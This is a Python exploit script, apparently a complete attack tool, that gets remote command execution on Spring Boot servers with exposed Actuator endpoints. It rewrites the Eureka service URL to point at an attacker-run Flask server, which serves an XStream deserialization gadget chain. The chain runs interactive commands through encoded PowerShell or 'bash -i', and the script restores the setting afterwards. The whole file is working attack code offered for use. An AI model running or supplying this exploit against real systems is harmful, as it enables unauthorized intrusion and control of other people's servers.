import argparse
import requests
import json
import binascii

# get env
def getEnv(url,version):
    if version == 1:
        url = url.strip('/')+'/env'
    elif version == 2:
        url = url.strip('/')+'/actuator/env'
    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0"}
    # get os name
    r = requests.get(url=url,headers=headers,verify=False,timeout=7).text
    osname = json.loads(r).get('systemProperties').get('os.name')
    # get eureka.client.serviceUrl.defaultZone
    try:
        ecsd = json.loads(r).get('manager').get('eureka.client.serviceUrl.defaultZone')
    except:
        ecsd = ''
    print("[eureka.client.serviceUrl.defaultZone] init value: "+ecsd)
    print("[osname]: "+osname)
    print("[spring actuator version]: "+str(version))
    return osname.lower(),ecsd

# set req headers and body format with version
def reqSet(version,server):
    if version == 1:
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }

    elif version == 2:
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0",
            "Content-Type": "application/json"
        }

    body = {
        "eureka.client.serviceUrl.defaultZone":server
    }

    return headers,body

# set custom command with os version
def commandSet(osname,command):
    if "windows" in osname:
        commandXml = """
            <string>powershell.exe</string>
            <string>-Enc</string>
            <string>"""+binascii.b2a_base64(command.encode('utf-16-le')).decode().replace('\n','')+"""</string>
        """
    elif "linux" in osname:
        commandXml = """
            <string>/bin/bash</string>
            <string>-c</string>
            <string>{echo,{"""+binascii.b2a_base64(command.encode('utf-8')).decode().replace('\n','')+"""}|{base64,-d}|{bash,-i}</string>
        """
    print("----------commandXml Payload----------")
    print(commandXml)
    print("----------commandXml Payload----------")
    return commandXml

# reset eureka.client.serviceUrl.defaultZone
def resetEnv(url,version,headers,initValue):
    if version == 1:
        envUrl = url.strip('/')+'/env'
        refreshUrl = url.strip('/')+'/refresh'
    elif version == 2:
        envUrl = url.strip('/')+'/actuator/env'
        refreshUrl = url.strip('/')+'/actuator/refresh'
    body = {
            "eureka.client.serviceUrl.defaultZone":initValue
        }
    # reset env value
    print("send post to reset eureka.client.serviceUrl.defaultZone")
    r = requests.post(url=envUrl,headers=headers,data=body,verify=False,timeout=7)
    if r.status_code == 200:
        print("env reset resp: "+r.text)

    # refresh
    print("send reset refresh to save")
    r = requests.post(url=refreshUrl,headers=headers,verify=False,timeout=7)
    if r.status_code == 200:
        print("reset refresh resp: "+r.text)
        print("reset completed")

# reset flask code
def restFlask():
    flaskserver = """
from flask import Flask
import random
app = Flask(__name__)
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=random.randint(10000,65535), debug=True)
"""
    with open("flaskserver.py","w") as fw:
        fw.write(flaskserver)   

# exploit
def exploit(url,headers,body,version,commandXml):
    if version == 1:
        envUrl = url.strip('/')+'/env'
        refreshUrl = url.strip('/')+'/refresh'
    elif version == 2:
        envUrl = url.strip('/')+'/actuator/env'
        refreshUrl = url.strip('/')+'/actuator/refresh'
    
    # set env
    print("post env to set eureka.client.serviceUrl.defaultZone")
    print("[payload data]: "+str(body))
    r = requests.post(url=envUrl,headers=headers,data=body,verify=False,timeout=7)
    if r.status_code == 200:
        print("env exploit resp: "+r.text)
        print("post env exploit completed")
    # refresh
    print("send refresh exploit to save")
    r = requests.post(url=refreshUrl,headers=headers,verify=False,timeout=7)
    if r.status_code == 200:
        print("refresh exploit resp: "+r.text)
        print("refresh exploit completed")

    # update flask xml
    flaskserver = f"""
from flask import Flask, Response
import random

app = Flask(__name__)

@app.route('/', defaults={{'path': ''}})
@app.route('/<path:path>', methods=['GET', 'POST'])
def catch_all(path):
    xml = \"\"\"<linked-hash-set>
  <jdk.nashorn.internal.objects.NativeString>
    <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
      <dataHandler>
        <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
          <is class="javax.crypto.CipherInputStream">
            <cipher class="javax.crypto.NullCipher">
              <serviceIterator class="javax.imageio.spi.FilterIterator">
                <iter class="javax.imageio.spi.FilterIterator">
                  <iter class="java.util.Collections$EmptyIterator"/>
                  <next class="java.lang.ProcessBuilder">
                    <command>
                       {commandXml}
                    </command>
                    <redirectErrorStream>false</redirectErrorStream>
                  </next>
                </iter>
                <filter class="javax.imageio.ImageIO$ContainsFilter">
                  <method>
                    <class>java.lang.ProcessBuilder</class>
                    <name>start</name>
                    <parameter-types/>
                  </method>
                  <name>foo</name>
                </filter>
                <next class="string">foo</next>
              </serviceIterator>
              <lock/>
            </cipher>
            <input class="java.lang.ProcessBuilder$NullInputStream"/>
            <ibuffer></ibuffer>
          </is>
        </dataSource>
      </dataHandler>
    </value>
  </jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>\"\"\"
    return Response(xml, mimetype='application/xml')


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=random.randint(10000,65535),debug=True)
"""
    print("reloading flaskserver")
    with open("flaskserver.py","w") as fw:
      fw.write(flaskserver)

# args need to exploit
def usageArgs():
    parser = argparse.ArgumentParser(description="eureka exploit")
    parser.add_argument("-u","--url",type=str,help="target url")
    parser.add_argument("-v","--version",type=int,help="target spring actuator version")
    parser.add_argument("-s","--server",type=str,help="flask server remote address")

    args = parser.parse_args()

    if args.url and args.version and args.server:
        print("--------------------------------------------------")
        osname,ecsd = getEnv(args.url,args.version)
        print("usage: cmd /c nslookup your_dnslog")
        print("usage: use \"reset\" to restore env or use \"exit\" to exit this program")
        print("[!!!attention please!!!]: dont forget reset env to avoid multiple execute command")
        while True:
            print("--------------------------------------------------")
            command = input("command > ")
            headers,body = reqSet(args.version,args.server)
            if command == "exit":
                restFlask()
                resetEnv(args.url,args.version,headers,ecsd)
                exit()
            if command == "reset":
                restFlask()
                resetEnv(args.url,args.version,headers,ecsd)
                continue
            resetEnv(args.url,args.version,headers,ecsd)
            commandXml = commandSet(osname,command)
            exploit(args.url,headers,body,args.version,commandXml)



if __name__ == '__main__':
    usageArgs()
